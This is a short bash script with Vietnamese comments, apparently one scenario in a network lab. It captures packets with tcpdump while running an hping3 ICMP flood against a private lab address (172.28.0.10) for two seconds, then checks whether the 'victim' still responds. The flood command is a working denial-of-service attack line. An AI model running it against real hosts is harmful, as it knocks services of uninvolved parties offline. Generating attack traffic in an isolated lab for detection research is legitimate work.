#!/bin/bash
set -euo pipefail
# Kịch bản 3: ICMP flood

TARGET="172.28.0.10"
IFACE="eth0"
DURATION=2

PCAP_DIR="${PCAP_DIR:-/root/pcap}"
mkdir -p "$PCAP_DIR"
TIME=$(date +%Y%m%d_%H%M%S)
PCAP="$PCAP_DIR/03_icmp_flood_$TIME.pcap"

echo "Bắt đầu bắt gói tin, lưu vào $PCAP"
tcpdump -i "$IFACE" -U -w "$PCAP" host "$TARGET" &
PID=$!
trap 'kill -INT "$PID" 2>/dev/null || true; wait "$PID" 2>/dev/null || true' EXIT
sleep 0.3
kill -0 "$PID"
sleep 2

echo "Chạy hping3 icmp flood trong $DURATION giây"
status=0
timeout "$DURATION" hping3 --icmp --flood "$TARGET" || status=$?
if [ "$status" -ne 0 ] && [ "$status" -ne 124 ]; then exit "$status"; fi

sleep 3
kill -INT "$PID"
wait "$PID" || true
trap - EXIT

echo "Xong rồi. Kiểm tra victim còn sống không: ping -c 3 $TARGET"
